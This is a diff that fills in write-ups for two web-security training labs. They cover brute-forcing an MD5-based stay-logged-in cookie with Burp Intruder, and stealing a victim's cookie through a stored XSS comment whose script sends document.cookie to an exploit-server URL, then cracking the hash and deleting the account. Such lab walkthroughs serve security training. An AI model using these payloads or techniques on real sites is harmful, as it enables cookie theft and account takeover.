@@ -497,11 +497,74 @@ Filter by:
 
 ### Analysis
 
-*(coming soon)*
+| | |
+|---|---|
+| **Vulnerability** | Vulnerable stay-logged-in functionality, brute force |
+| **Goal** | Login as carlos |
+| **Key Concept** | The stay-logged-in cookie decodes to a username and the MD5 hash of the password. Using a password list, the hash for `carlos` can be brute-forced to log in |
 
 ### Steps
 
-*(coming soon)*
+**1.** Start the lab, login as `wiener` / `peter`, and check "Stay logged in"
+
+![](/assets/labs/authenticationv/lll/image.png)
+
+
+**2.** Logged in — go to "My account" and use the "Update email" button
+
+![](/assets/labs/authenticationv/lll/image-1.png)
+
+**3.** Reload the page and intercept the request with Burp
+
+![](/assets/labs/authenticationv/lll/image-2.png)
+
+**4.** Found the stay-logged-in cookie — send it to Decoder to inspect
+
+![](/assets/labs/authenticationv/lll/image-3.png)
+
+**5.** First part decodes to the username `wiener:` followed by a colon
+
+**6.** Send the second part to CrackStation to identify the hash type
+
+![](/assets/labs/authenticationv/lll/image-4.png)
+
+**7.** Confirmed the hash is MD5
+
+**8.** Modify the request in Intruder to use `carlos` as the username, and remove the `id`, stay-logged-in, and session parameters from the request
+
+![](/assets/labs/authenticationv/lll/image-6.png)
+
+**9.** Download a password list, or copy one to a local file
+
+![](/assets/labs/authenticationv/lll/image-7.png)
+
+![](/assets/labs/authenticationv/lll/image-8.png)
+
+**10.** Set up the payload in Intruder:
+
+- First, hash each password with MD5
+
+![](/assets/labs/authenticationv/lll/image-9.png)
+
+- Add the prefix `carlos:`
+
+![](/assets/labs/authenticationv/lll/image-10.png)
+
+- Encode everything with Base64
+
+![](/assets/labs/authenticationv/lll/image-11.png)
+
+**11.** Start the attack and filter by `200` responses
+
+![](/assets/labs/authenticationv/lll/image-12.png)
+
+**12.** Found the valid password — right-click and choose "Show in browser"
+
+![](/assets/labs/authenticationv/lll/image-13.png)
+
+**13.** Copy the URL → open it in the browser →  Solved
+
+![](/assets/labs/authenticationv/lll/image-14.png)
 
 ---
 
@@ -509,13 +572,53 @@ Filter by:
 
 > **Level:** `PRACTITIONER`
 
+![](/assets/labs/authenticationv/lll/image-15.png)
+
 ### Analysis
 
-*(coming soon)*
+| | |
+|---|---|
+| **Vulnerability** | Vulnerable stay-logged-in functionality, brute force |
+| **Goal** | Login as carlos and delete the account |
+| **Key Concept** | The stay-logged-in cookie decodes to a username and the MD5 hash of the password. By stealing carlos's cookie via XSS and cracking the hash with a password list, the account can be accessed and deleted |
 
 ### Steps
 
-*(coming soon)*
+**1.** Start the lab and login as `wiener` / `peter` with "Stay logged in" checked
+
+![](/assets/labs/authenticationv/lll/image-16.png)
+
+**2.** Go to the home page, open any post, and submit a comment with the body:
+
+```js
+<script>document.location='$get your url form exploit server button$'+document.cookie</script>
+```
+
+![](/assets/labs/authenticationv/lll/image-17.png)
+
+**3.** Submit the comment and check the exploit server's access log tab
+
+![](/assets/labs/authenticationv/lll/image-18.png)
+
+**4.** Carlos's stay-logged-in cookie appears — decode it with Burp to reveal the username `carlos` and the MD5 hash of the password
+
+![](/assets/labs/authenticationv/lll/image-19.png)
+
+**5.** Crack the MD5 hash using CrackStation
+
+![](/assets/labs/authenticationv/lll/image-20.png)
+
+**6.** Now have the username `carlos` and the cracked password
+
+![](/assets/labs/authenticationv/lll/image-21.png)
+
+**7.** Login with these credentials
+
+![](/assets/labs/authenticationv/lll/image-22.png)
+
+**8.** Enter the password and delete the account →  Solved
+
+![](/assets/labs/authenticationv/lll/image-23.png)
 
 ---
 
